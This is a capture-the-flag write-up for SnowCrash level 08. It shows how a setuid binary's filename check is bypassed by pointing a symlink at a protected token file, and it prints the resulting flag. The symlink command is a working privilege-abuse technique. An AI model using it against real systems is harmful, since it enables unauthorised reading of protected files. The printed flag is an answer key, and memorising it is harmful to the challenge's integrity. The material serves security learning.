# Level 08

## Analysis

In the user's home directory, we found two files:

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

The first file is a binary, and the second is a file named `token` which we cannot read directly.

Upon executing the binary, it prompts for a file to read:

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

Our objective is to read the contents of the `token` file using the binary.

Through experimentation with the binary to read various files, it appears that the binary uses the `strstr` function to compare the first argument (`argv[1]`) with the string "token". The workaround is to create a symlink to the `token` file, bypassing the filename comparison in the binary's logic:

```bash
ln -sf /home/user/level08/token /tmp/symlink && ./level08 /tmp/symlink
```

Executing the binary with the symlink allowed us to read the contents of the `token` file, revealing the flag: `quif5eloekouj29ke0vouxean`.

**Type of Exploit**: Symbolic Link Exploitation